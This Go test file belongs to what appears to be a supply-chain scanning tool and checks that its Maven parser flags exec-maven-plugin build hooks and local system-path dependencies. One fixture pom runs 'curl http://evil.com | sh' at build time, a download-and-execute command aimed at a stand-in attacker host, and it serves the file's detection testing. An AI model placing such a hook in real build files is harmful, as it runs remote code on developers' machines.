package heuristics

import (
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
)

func TestMavenParser(t *testing.T) {
	t.Run("exec-maven-plugin becomes build hook", func(t *testing.T) {
		pom := []byte(`<project>
  <build><plugins>
    <plugin>
      <groupId>org.codehaus.mojo</groupId>
      <artifactId>exec-maven-plugin</artifactId>
      <configuration>
        <executable>sh</executable>
        <arguments><argument>-c</argument><argument>curl http://evil.com | sh</argument></arguments>
      </configuration>
    </plugin>
  </plugins></build>
</project>`)
		p := &mavenParser{}
		pkg := p.Parse("com.example:lib", nil, domain.PackageSource{
			Files: map[string][]byte{"pom.xml": pom},
		})
		if len(pkg.Hooks) == 0 {
			t.Fatal("want build hook, got none")
		}
		if pkg.Hooks[0].Phase != "build" {
			t.Errorf("phase: got %q want build", pkg.Hooks[0].Phase)
		}
		if pkg.Hooks[0].Body != "sh" {
			t.Errorf("body: got %q want sh", pkg.Hooks[0].Body)
		}
	})

	t.Run("systemPath becomes local dep", func(t *testing.T) {
		pom := []byte(`<project><dependencies>
  <dependency>
    <groupId>com.example</groupId>
    <artifactId>local-lib</artifactId>
    <scope>system</scope>
    <systemPath>/opt/lib/local.jar</systemPath>
  </dependency>
</dependencies></project>`)
		p := &mavenParser{}
		pkg := p.Parse("com.example:app", nil, domain.PackageSource{
			Files: map[string][]byte{"pom.xml": pom},
		})
		if len(pkg.Deps) == 0 {
			t.Fatal("want local dep, got none")
		}
		if pkg.Deps[0].Source != DepSourceLocal {
			t.Errorf("source: got %v want DepSourceLocal", pkg.Deps[0].Source)
		}
	})

	t.Run("clean pom produces no hooks or deps", func(t *testing.T) {
		pom := []byte(`<project>
  <dependencies><dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-core</artifactId>
    <version>6.0.0</version>
  </dependency></dependencies>
</project>`)
		p := &mavenParser{}
		pkg := p.Parse("com.example:clean", nil, domain.PackageSource{
			Files: map[string][]byte{"pom.xml": pom},
		})
		if len(pkg.Hooks) != 0 {
			t.Errorf("unexpected hooks: %v", pkg.Hooks)
		}
		if len(pkg.Deps) != 0 {
			t.Errorf("unexpected deps: %v", pkg.Deps)
		}
	})
}
